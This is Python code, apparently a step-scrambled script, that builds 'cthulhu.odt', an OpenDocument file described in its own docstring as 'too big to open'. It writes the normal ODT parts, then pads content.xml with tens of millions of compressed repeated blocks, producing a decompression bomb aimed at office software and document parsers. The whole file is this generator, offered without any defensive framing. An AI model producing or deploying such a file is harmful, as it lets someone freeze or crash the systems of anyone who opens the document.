@process_step_to_scramble
def processing_step(shrobj):

	def contentxml_gen():
		"""Generates balooned content.xml file data."""
		yield shrobj.contentxml[1]
		shrobj.part2_beg = shrobj.contentxml[2][:shrobj.contentxml[2].find("AAA")]
		shrobj.part2_end = shrobj.contentxml[2][shrobj.contentxml[2].find("AAA"):]
		shrobj.aaaa = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		for i in range(100):
			yield shrobj.part2_beg
			for j in range(100000):
				yield shrobj.aaaa
			yield shrobj.part2_end
		for i in range(1000000):
			yield shrobj.contentxml[3]
		yield shrobj.contentxml[4]
	shrobj.contentxml_gen = [contentxml_gen]


@process_step_to_scramble
def processing_step(shrobj):
	def f():
		shrobj.contentxml = {} # dict for individual parts of content.xml
		for i in range(1,5):
			shrobj.contentxml[i] = globals()["odt_contents_content_xml_part"+str(i)]
	shrobj.contextxml_read = [f]


@process_step_to_scramble
def processing_step(shrobj):
	def f():
		shrobj.save_stored[0]("mimetype", odt_contents_mimetype) # needs to be as the first file and uncompressed
		shrobj.save[0]("META-INF/manifest.xml", odt_contents_META_INF_manifest_xml)
		shrobj.save[0]("manifest.rdf", odt_contents_manifest_rdf)
		shrobj.save[0]("meta.xml", odt_contents_meta_xml)
		shrobj.save[0]("settings.xml", odt_contents_settings_xml)
		shrobj.save[0]("styles.xml", odt_contents_styles_xml)
	shrobj.savesimple = [f]


@process_step_to_scramble
def processing_step(shrobj):
	def save(fname, fstr):
		#shrobj.odt.write(filename=os.path.join(shrobj.template_path, "odt_template/", f), arcname=f, compress_type=zipfile.ZIP_DEFLATED)
		shrobj.odt.writestr(fname, fstr, compress_type=zipfile.ZIP_DEFLATED)
	def save_stored(fname, fstr):
		shrobj.odt.writestr(fname, fstr, compress_type=zipfile.ZIP_STORED)
	shrobj.save = [save]
	shrobj.save_stored = [save_stored]

@process_step_to_scramble
def processing_step(shrobj):
	def f():
		shrobj.odt.writegen("content.xml", shrobj.contentxml_gen[0](), compress_type=zipfile.ZIP_DEFLATED)
	shrobj.save_balooned_contentxml = [f]


@process_step_to_scramble
def processing_step(shrobj):
	def f():
		"""Creates an ODT file that is too big to open."""
		with zipfile.ZipFile(shrobj.filename, 'w') as odt:
			shrobj.odt = odt
			shrobj.savesimple[0]()
			shrobj.contextxml_read[0]()
			shrobj.save_balooned_contentxml[0]()
	shrobj.write_odt = [f]
	

@process_step_to_scramble
def processing_step(shrobj):
	shrobj.filename = "cthulhu.odt"
	shrobj.template_path = "templates"
	shrobj.write_odt[0]()



